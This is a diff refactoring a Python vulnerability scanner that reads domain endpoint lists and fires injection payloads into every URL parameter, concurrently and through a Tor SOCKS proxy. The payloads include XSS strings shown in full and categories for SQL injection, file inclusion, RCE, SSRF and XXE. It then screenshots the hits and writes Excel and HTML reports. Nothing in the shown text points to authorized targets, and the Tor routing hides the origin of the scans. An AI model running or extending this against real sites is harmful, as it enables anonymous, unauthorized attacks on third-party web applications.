@@ -25,13 +25,17 @@ for domain in "${domains[@]}"; do
 done
 
 python3 - << 'PYTHON_EOF'
-import os, threading, random, time, json, requests, pandas as pd
+import os, requests, threading, random, time
+from concurrent.futures import ThreadPoolExecutor, as_completed
+import pandas as pd
 from selenium import webdriver
 from selenium.webdriver.chrome.options import Options
 from jinja2 import Template
 
-domains=[f.split('_')[1].split('.')[0] for f in os.listdir('.') if f.startswith('endpoints_')]
-if not os.path.exists('screenshots'): os.mkdir('screenshots')
+MAX_THREADS = 10
+TOR_PROXY = {'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}
+SCREENSHOT_DIR = 'screenshots'
+os.makedirs(SCREENSHOT_DIR, exist_ok=True)
 
 payload_types = {
     'xss':['<script>alert(1)</script>','<img src=x onerror=alert(1)>','<svg/onload=alert(1)>','"><svg/onload=alert(1)>','{{7*7}}','<iframe srcdoc="<script>alert(1)</script>">'],
@@ -50,12 +54,10 @@ payload_types = {
     'template':["{{7*7}}"]
 }
 
-all_payloads=[v for k,v in payload_types.items()]
-
-proxy={'http':'socks5h://127.0.0.1:9050','https':'socks5h://127.0.0.1:9050'}
-results=[]
-lock=threading.Lock()
-colors={'xss':'yellow','sqli':'red','lfi':'blue','rce':'orange','ssrf':'green','ssti':'purple','xxe':'pink','redirect':'cyan','crlf':'grey','cache':'brown','jwt':'lime','json':'teal','file':'magenta','template':'gold'}
+all_payloads = [p for sublist in payload_types.values() for p in sublist]
+colors = {'xss':'yellow','sqli':'red','lfi':'blue','rce':'orange','ssrf':'green','ssti':'purple','xxe':'pink','redirect':'cyan','crlf':'grey','cache':'brown','jwt':'lime','json':'teal','file':'magenta','template':'gold'}
+results = []
+lock = threading.Lock()
 
 def fetch_cve(server):
     cves=[]
@@ -75,41 +77,38 @@ def detect_type(payload):
         if k in payload.lower(): return k
     return 'other'
 
-def try_chain(url,param,chain):
-    steps=[]
-    current_url=url
+def try_payload(url,param,payload):
     try:
-        for payload in chain:
-            r=requests.get(current_url,params={param:payload},timeout=10,proxies=proxy)
-            severity='High' if payload in r.text else 'Low'
-            score=9.0 if severity=='High' else 3.0
-            server=r.headers.get('Server','Unknown')
-            cves=fetch_cve(server)
-            ai_score=ai_risk_score(payload,severity,score)
-            lock.acquire()
-            result={'url':current_url,'param':param,'payload':payload,'severity':severity,'score':score,'ai_score':ai_score,'server':server,'cves':cves,'type':detect_type(payload)}
+        r=requests.get(url,params={param:payload},timeout=10,proxies=TOR_PROXY)
+        severity='High' if payload in r.text else 'Low'
+        score=9.0 if severity=='High' else 3.0
+        server=r.headers.get('Server','Unknown')
+        cves=fetch_cve(server)
+        ai_score=ai_risk_score(payload,severity,score)
+        result={'url':url,'param':param,'payload':payload,'severity':severity,'score':score,'ai_score':ai_score,'server':server,'cves':cves,'type':detect_type(payload)}
+        with lock:
             results.append(result)
-            steps.append(result)
-            lock.release()
-            current_url=current_url+"?p="+payload
-    except: pass
-    return steps
+        return result
+    except:
+        return None
 
-threads=[]
+domains=[f.split('_')[1].split('.')[0] for f in os.listdir('.') if f.startswith('endpoints_')]
+endpoints_map = {}
 for domain in domains:
     with open(f'endpoints_{domain}.txt') as f:
         endpoints=[line.strip() for line in f if line.strip()]
-    for url in endpoints:
-        if '?' in url:
-            params=url.split('?')[1].split('&')
-            for p in params:
-                key=p.split('=')[0]
-                for chain in all_payloads:
-                    t=threading.Thread(target=try_chain,args=(url,key,chain))
-                    t.start()
-                    threads.append(t)
-                    time.sleep(random.uniform(0.05,0.15))
-for t in threads: t.join()
+        endpoints_map[domain] = [e for e in endpoints if '?' in e]
+
+with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
+    futures=[]
+    for domain,endpoints in endpoints_map.items():
+        for url in endpoints:
+            params=[p.split('=')[0] for p in url.split('?')[1].split('&')]
+            for param in params:
+                for payload in all_payloads:
+                    futures.append(executor.submit(try_payload,url,param,payload))
+    for f in as_completed(futures):
+        _=f.result()
 
 options=Options()
 options.headless=True
@@ -117,21 +116,21 @@ options.add_argument('--no-sandbox')
 options.add_argument('--disable-dev-shm-usage')
 driver=webdriver.Chrome(options=options)
 timeline={}
+
 for idx,item in enumerate(results):
     try:
         driver.get(item['url'])
         driver.execute_script(f"var span=document.createElement('span');span.style.background='{colors.get(item['type'],'white')}';span.innerText='{item['payload']}';document.body.prepend(span);")
-        screenshot_path=f"screenshots/{item['param']}_{idx}.png"
+        screenshot_path=f"{SCREENSHOT_DIR}/{item['param']}_{idx}.png"
         driver.save_screenshot(screenshot_path)
         item['screenshot']=screenshot_path
         timeline.setdefault(item['url'],[]).append({'payload':item['payload'],'screenshot':screenshot_path,'step':idx})
     except: continue
 driver.quit()
 
-wb=pd.ExcelWriter('report.xlsx',engine='xlsxwriter')
 df=pd.DataFrame(results)
-df.to_excel(wb,sheet_name='ScanResults',index=False)
-wb.save()
+with pd.ExcelWriter('report.xlsx',engine='xlsxwriter') as wb:
+    df.to_excel(wb,sheet_name='ScanResults',index=False)
 
 html_template="""
 <html>
@@ -172,11 +171,7 @@ html_template="""
 </table>
 <script>
 $(document).ready(function() {
-    $('#report').DataTable({
-        "paging":true,
-        "searching":true,
-        "order":[[4,'desc']]
-    });
+$('#report').DataTable({"paging":true,"searching":true,"order":[[4,'desc']]});
 });
 </script>
 </body></html>
